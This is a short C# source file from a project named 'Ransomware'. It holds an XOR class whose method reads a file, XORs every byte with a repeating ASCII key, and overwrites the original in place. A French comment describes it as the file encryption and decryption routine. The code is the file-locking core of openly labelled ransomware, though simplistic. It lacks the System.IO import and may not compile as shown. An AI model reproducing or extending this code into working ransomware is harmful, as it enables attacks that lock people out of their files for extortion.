using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Ransomware
{
    internal class XOR
    {
        byte[] _key;
        public XOR(string key)
        {
            _key = Encoding.ASCII.GetBytes(key);
        }

        // Fonction d'encryption (et décryption) d'un fichier
        public void encrypt(string path)
        {
            int cptKey = 0;
            try
            {
                byte[] data = File.ReadAllBytes(path);
                for (int i = 0; i < data.Length; i++)
                {
                    data[i] ^= _key[cptKey];
                    cptKey++;
                    if (cptKey >= _key.Length)
                    {
                        cptKey = 0;
                    }
                }
                File.WriteAllBytes(path, data);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
        }
    }
}
